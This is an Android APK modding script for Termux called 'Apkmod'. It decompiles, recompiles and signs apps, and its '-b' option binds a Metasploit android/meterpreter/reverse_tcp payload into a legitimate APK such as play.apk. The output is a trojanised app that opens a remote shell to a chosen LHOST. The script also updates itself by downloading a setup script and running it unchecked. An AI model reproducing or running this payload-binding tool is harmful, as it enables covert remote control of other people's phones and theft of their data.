#!/data/data/com.termux/files/usr/bin/bash

########################################
# Project : Apkmod     		       #
# Author  : Lokesh @Hax4us	       #
# Email   : lkpandey950@gmail.com      #
########################################

CWD=$(pwd)
VERSION="1.2"

#colors
cyan='\033[1;36m'                       
green='\033[1;32m'                      
red='\033[1;31m'                        
yellow='\033[1;33m'                     
blue='\033[1;34m'                       
purple='\033[1;35m'
reset='\033[0m'

usage() {
	printf "${yellow}Usage: apkmod [option] [EXTRAARGS] [/path/to/input.apk] [/path/to/output.apk]\n${purple}valid options are:${blue}\n  -v		print version\n  -d		For decompiling\n  -r		For recompiling\n  -s		For signing\n  -b		For binding payload\n  -o\t\tSpecify output file or directory\n  -a\t\tUse aapt2\n${yellow}Example:\n  ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444  ${purple}bind the payload with play.apk and saves output in given directory.\n${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
}

error_msg() {
	printf "${red}[!] ${yellow}${1}${reset}\n"
}

print_status() {
	printf "${blue}[*] ${green}${1}\n${reset}"
}

file_exist() {
	if [ ! -e "${1}" ]; then
		error_msg "file (${1}) does not exist"
		exit 1
	fi
}

dir_exist() {
	if [ ! -d "${1}" ]; then
		error_msg "directory (${1}) does not exist"
		exit 1
	fi
}

decompile() {
	print_status "Decompiling ${1}"
	apktool d -f ${1} -o ${2}
    if [ ! -e ${2} ]; then
        error_msg "Can't bind, take screenshot and open a issue on github"
        exit 1
    fi
	print_status "Decompiled into ${2}"
}

recompile() {
	print_status "Recompiling ${1}"
    if [ "${USE_AAPT2}" = "yes" ]; then
        apktool b --use-aapt2 /usr/bin/aapt2 -o ${2} ${1}
    else
        apktool b -a /usr/bin/aapt -o ${2} ${1}
    fi
    if [ ! -e ${2} ]; then
        error_msg "Can't recompile, take screenshot and open a issue on github"
        exit 1
    fi
	print_status "Recompiled to ${2}"
}

signapk() {
	print_status "Signing ${1}"
	apksigner -p android keystore ${1} ${2}
    if [ ! -e ${2} ]; then
        error_msg "Can't sign, take screenshot and open a issue on github"
        exit 1
    fi
	print_status "Signed to ${2}"
}

#########################
# Bind payload with APK #
#########################

bindapk() {
	print_status "Binding ${3}"
	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
	if [ ! -e ${4} ]; then
		error_msg "Can't bind, take screenshot and open a issue on github"
		exit 1
	fi
	print_status "Binded to ${4}"
}

#########################
# Validate User's input #
#########################

validate_input() {
	if [ "${1}" = "-b" ]; then
		if [ "$#" -ne 5 ]; then
			usage
			exit 1
		fi
		file_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
		usage
		exit 1
	fi

	if [ "${1}" = "-d" -o "${1}" = "-s" ]; then
		file_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ "${1}" = "-r" ]; then
		dir_exist "${2}"
		dir_exist "${3%\/*}"
	fi
}

###############################
# do automatic update check & #
# ask for update if available #
###############################

update() {
	temp=$(curl -L -s https://github.com/Hax4us/Apkmod/raw/master/apkmod.sh | grep -w "VERSION=" | head -n1)
	N_VERSION=$(echo ${temp} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
	if [ "${1}" != "-u" ]; then
		[ 1 -eq $(echo "${N_VERSION} != ${VERSION}" | bc -l) ] && print_status "Update is available, run [ apkmod -u ] for update" && exit 1
	fi
	if [ "${1}" = "-u" ]; then
		cd && wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh
	fi
}

##############
#    MAIN    #
##############

# check for update only if net is ON
wget -q --spider http://google.com
if [ $? -eq 0 ]; then
    update
fi

if [ $# -eq 0 ]; then
    usage
    exit 1
fi

while getopts ":d:r:s:b:o:hv" opt; do
    case $opt in
        d)
            ACTION="decompile"
            ARG="-d"
            in_abs_path=$(readlink -f ${OPTARG})
            ;;
        r)
            ACTION="recompile"
            ARG="-r"
            in_abs_path=$(readlink -f ${OPTARG})
            ;;
        s)
            ACTION="signapk"
            ARG="-s"
            in_abs_path=$(readlink -f ${OPTARG})
            ;;
        b)
            ACTION="bindapk"
            ARG="-b"
            in_abs_path=$(readlink -f ${OPTARG})
            LHOST=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LHOST | cut -d "=" -f2)
            LPORT=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LPORT | cut -d "=" -f2)
            ;;
        o)
            out_abs_path=$(readlink -f ${OPTARG})
            ;;
        a)
            USE_AAPT2="TRUE"
            ;;
        h)
            usage
            exit 0
            ;;
        v)
            printf "${yellow}${VERSION}\n${reset}"
            exit 0
            ;;
        u)
            print_status "Updating ..."
            update ${opt}
            print_status "Update completed"
            exit 0
            ;;
        \?)
            error_msg "Invalid option: -$OPTARG"
            exit 1
            ;;
        :)
            error_msg "option -$OPTARG requires an argument"
            exit 1
            ;;
    esac
done

## Lets validate user's input
if [ "${ARG}" = "-d" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "-r" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "-s" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "-b" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path} ${LHOST} ${LPORT}
fi

## Lhost or lport will be ignored for all actions except bindapk
${ACTION} ${LHOST} ${LPORT} ${in_abs_path} ${out_abs_path}
